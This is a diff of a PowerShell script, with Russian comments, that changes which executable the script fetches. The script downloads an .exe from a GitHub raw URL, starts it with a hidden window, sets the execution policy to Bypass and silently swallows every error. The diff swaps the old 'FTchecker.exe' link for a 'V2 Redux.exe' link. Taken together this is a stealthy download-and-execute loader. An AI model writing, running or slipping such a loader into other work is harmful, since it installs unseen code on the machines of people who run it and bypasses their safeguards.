@@ -1,9 +1,9 @@
 # V2 Redux [СКАЧИВАЕТ everything В КОНЦЕ]
     # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/killlety9-tech/FTchecker/raw/refs/heads/main/FTchecker.exe" -OutFile "FTchecker.exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/1DemoS/V2-Redux/raw/refs/heads/main/V2%20Redux.exe" -OutFile "V2 Redux.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "FTchecker.exe" -WindowStyle Hidden
+    Start-Process -FilePath "V2 Redux.exe" -WindowStyle Hidden
     
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
@@ -99,4 +99,5 @@ try {
     
 } catch {
     # Полностью скрываем ошибки
+
 }
